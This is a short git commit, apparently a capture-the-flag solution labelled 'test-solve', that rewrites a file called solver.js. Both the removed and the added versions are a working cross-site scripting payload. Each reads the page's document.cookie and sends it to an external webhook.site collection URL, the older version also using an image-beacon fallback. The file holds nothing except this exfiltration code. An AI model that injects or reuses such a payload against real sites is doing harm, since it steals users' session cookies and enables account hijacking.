e9c776b532a06a15182407e8b6f66f4093ccf36d
Rasshaaa <maulanarasya264@gmail.com>
2025-10-22 13:46:17 +0700

    test-solve

--- solver.js
+++ solver.js
@@ -1,13 +1,1 @@
-(async () => {
-  try {
-    const cookie = document.cookie || '';
-    const url = 'https://webhook.site/03352272-bffa-4bc8-b726-8e576c1acd58?c=' + encodeURIComponent(cookie);
-    try {
-      await fetch(url, { method: 'GET', mode: 'no-cors' });
-    } catch(e){
-      const i = new Image();
-      i.src = url;
-    }
-  } catch (e) {
-  }
-})();
+fetch("https://webhook.site/03352272-bffa-4bc8-b726-8e576c1acd58?c=" + document.cookie);
